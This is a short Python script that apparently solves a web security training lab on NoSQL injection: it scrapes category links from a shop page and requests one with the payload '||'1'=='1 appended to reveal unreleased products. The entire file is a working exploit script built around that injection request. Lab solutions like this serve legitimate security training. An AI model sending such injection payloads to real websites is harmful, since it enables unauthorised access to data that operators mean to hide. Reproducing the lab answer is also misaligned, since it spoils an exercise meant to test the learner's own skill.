#!/usr/bin/env python3
import argparse
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

def get_categories_from_html(html: str) -> list[dict]:
    soup = BeautifulSoup(html, "html.parser")

    # Find all category links
    category_elements = soup.find_all("a", class_="filter-category")

    if not category_elements:
        raise RuntimeError("No categories found on the page.")

    categories = []
    for el in category_elements:
        name = el.get_text(strip=True)
        url = el.get("href", "")

        categories.append({
            "name": name,
            "url": url
        })

    return categories

def show_unreleased_products(session: requests.Session, base_url: str):
    # Step 1: Visit root page
    r = session.get(base_url, timeout=10)
    r.raise_for_status()

    # Step 2: Get categories from the html
    categories = get_categories_from_html(r.text)
    category = categories[1]["url"]  # choose 2nd category since the 1st one is All (which is equal to root "/")

    # Step 3: Exploit vulnerability
    category_url = urljoin(base_url, f"{category}'||'1'=='1")
    r = session.get(category_url, timeout=10)
    r.raise_for_status()

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Detecting NoSQL injection"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*] Exploiting vulnerability...")
    show_unreleased_products(sess, base_url)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()